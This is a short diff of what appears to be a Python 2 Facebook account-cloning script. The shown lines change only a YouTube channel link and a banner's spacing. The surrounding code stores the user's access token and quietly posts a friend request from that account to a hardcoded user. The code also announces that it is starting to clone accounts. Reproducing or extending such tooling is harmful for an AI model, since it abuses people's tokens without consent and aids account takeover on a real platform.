@@ -177,7 +177,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;36;40m[✓] Login Successful...'
-				os.system('xdg-open https://www.youtube.com/channel/UCQA7FnNlK8iQ6rnhdTpk4Aw')
+				os.system('xdg-open https://www.youtube.com/channel/UCk9SbjpUFC-hhFMeh16FhDw ')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -338,7 +338,7 @@ def pilih_super():
 	print "\n\033[1;97m        ❈     \033[1;97mTo Stop Process Press CTRL+Z \033[1;97m    ❈"
 	print "   \033[1;31;48m●💋══════════════════◄►══════════════════💋●"
 
-	jalan('        \033[1;97mSM TECH BD/SM MON start cloning Wait...')
+	jalan('      \033[1;97mSM TECH BD/SM MON start cloning Wait...')
 	print  "  \033[1;36;48m●💋══════════════════◄►══════════════════💋●" 
 
 	def main(arg):
